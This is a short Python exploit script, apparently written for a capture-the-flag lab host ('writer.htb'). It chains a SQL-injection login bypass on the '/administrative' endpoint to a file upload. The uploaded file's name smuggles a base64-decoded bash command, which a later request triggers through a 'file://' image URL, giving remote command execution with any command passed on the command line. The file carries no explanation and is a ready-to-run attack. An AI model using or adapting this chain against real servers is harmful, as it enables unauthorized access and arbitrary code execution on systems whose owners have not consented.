import sys
import requests as r
import base64

s = r.Session()
command = base64.b64encode(f'{sys.argv[1]}'.encode('UTF-8')).decode('UTF-8')
url = 'http://10.10.11.101'
print('[+] Authenticating...')
s.post(f"{url}/administrative", data="uname=test'+OR+1=1;--+-&password=test", headers={"Content-Type": "application/x-www-form-urlencoded"})
header = {"Content-Type": "multipart/form-data; boundary=---------------------------104520914830002980111528570838"}
filename = f"kwakkwak.jpg;echo {command}|base64 -d|bash;"
print('[+] Uploading file...')
upload_data = f"""-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="author"\r\n\r\ntest\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="title"\r\n\r\ntest\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="tagline"\r\n\r\ntest\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="image"; filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="image_url"\r\n\r\n\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="content"\r\n\r\ntest\r\n-----------------------------104520914830002980111528570838--\r\n"""
s.post(f"{url}/dashboard/stories/add", headers=header, data=upload_data)
print('[+] Invoking File protocol...')
file_data = f"""-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="author"\r\n\r\ntest\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="title"\r\n\r\ntest\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="tagline"\r\n\r\ntest\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="image_url"\r\n\r\nfile:///var/www/writer.htb/writer/static/img/{filename}\r\n-----------------------------104520914830002980111528570838\r\nContent-Disposition: form-data; name="content"\r\n\r\ntest\r\n-----------------------------104520914830002980111528570838--\r\n"""
s.post(f"{url}/dashboard/stories/add", headers=header, data=file_data)
s.close()